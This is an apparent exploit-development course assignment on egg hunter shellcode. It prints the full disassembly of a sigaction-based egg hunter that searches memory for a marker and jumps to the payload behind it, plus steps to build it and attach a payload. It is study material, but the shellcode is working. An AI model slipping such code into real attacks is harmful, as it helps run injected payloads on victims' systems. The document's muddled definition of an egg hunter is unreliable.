# Assignment 3

## What to do:

-Study about the Egg Hunter shellcode

-Create a working demo of the Egghunter

-Should be configurable for different payloads

## Solutions:

1) Study about the Egg Hunter of the shellcode: 

All the information used to solve this section was found at [Safely Searching Process Virtual Address Space].

First of all, what is an Egg Hunter?

As it is said in the paper, is a virtual address space where we can inject the code/payload which couldn't anywhere in the current process. The egg is the marker that helps the payload to be located by the exploit. In this case, the sigaction method is the one selected to be implemented.

        00000000  6681C9FF0F        or cx,0xfff
        00000005  41                inc ecx
        00000006  6A43              push byte +0x43
        00000008  58                pop eax
        00000009  CD80              int 0x80
        0000000B  3CF2              cmp al,0xf2
        0000000D  74F1              jz 0x0
        0000000F  B890509050        mov eax,0x50905090
        00000014  89CF              mov edi,ecx
        00000016  AF                scasd
        00000017  75EC              jnz 0x5
        00000019  AF                scasd
        0000001A  75E9              jnz 0x5
        0000001C  FFE7              jmp edi


2) Create the nasm code that will reproduce the eggcode.

        Compile Egg_Hunter.nasm using compile.sh 
        Use objdump to obtain the eggcode.
        Copy to Skeleton_shellcode.c the eggcode and the payload. The rest will be done by itself.
  
3) Configure the shellcode to fit any payload selected by the user.
